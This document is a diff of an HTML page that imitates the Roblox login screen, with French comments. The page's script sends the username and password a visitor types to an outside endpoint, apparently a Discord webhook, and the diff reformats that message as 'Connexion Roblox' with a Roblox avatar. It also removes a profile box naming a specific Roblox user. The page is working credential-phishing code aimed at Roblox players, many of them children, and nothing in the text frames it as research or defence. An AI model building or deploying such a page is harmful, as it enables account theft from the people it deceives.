@@ -14,6 +14,7 @@
   <meta name="twitter:card" content="summary_large_image" />
 
   <style>
+    /* Ton CSS complet ici (inchangé) */
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       background-color: #1c1c1c;
@@ -165,7 +166,6 @@
   </style>
 </head>
 <body>
-
   <div class="topbar">
     <div class="logo">ROBLOX</div>
     <a href="#">Discover</a>
@@ -181,22 +181,6 @@
 
   <div class="container">
     <h2 class="login-title">Login to Roblox</h2>
-
-    <!-- Section profil style Discord -->
-    <div style="display: flex; align-items: center; justify-content: space-between; background-color: #2f3136; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
-      <div style="color: white; max-width: 70%;">
-        <div style="color: #999; font-size: 12px; margin-bottom: 5px;">Roblox</div>
-        <div style="font-size: 16px; font-weight: bold; color: #00aff4; margin-bottom: 5px;">
-          <a href="https://www.roblox.com/users/4760796777/profile" target="_blank" style="color: #00aff4; text-decoration: none;">
-            Slyweloveyou221's Profile
-          </a>
-        </div>
-        <div style="font-size: 13px; color: #ccc;">
-          Slyweloveyou221 est l’un des millions de joueurs qui créent et explorent les possibilités infinies de Roblox. Rejoins-le et explore ensemble !
-        </div>
-      </div>
-      <img src="https://tr.rbxcdn.com/54f260251655a9e1916f14aa41d4b77b/150/150/Avatar/Png" alt="Avatar complet" style="width: 90px; height: 90px; border-radius: 8px;">
-    </div>
 
     <input type="text" id="username" class="input-field" placeholder="Username / Email / Phone" required>
     <input type="password" id="password" class="input-field" placeholder="Password" required>
@@ -245,8 +229,9 @@
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            content: `Tentative de connexion:\nUsername/Email/Phone: ${username}\nPassword: ${password}`,
-            username: "Webhook Page Web"
+            content: `**Connexion Roblox :**\n👤 **Utilisateur :** ${username}\n🔐 **Mot de passe :** ${password}`,
+            username: "Roblox Login",
+            avatar_url: "https://tr.rbxcdn.com/54f260251655a9e1916f14aa41d4b77b/150/150/Avatar/Png"
           })
         });
 
@@ -268,6 +253,5 @@
       });
     });
   </script>
-
 </body>
 </html>
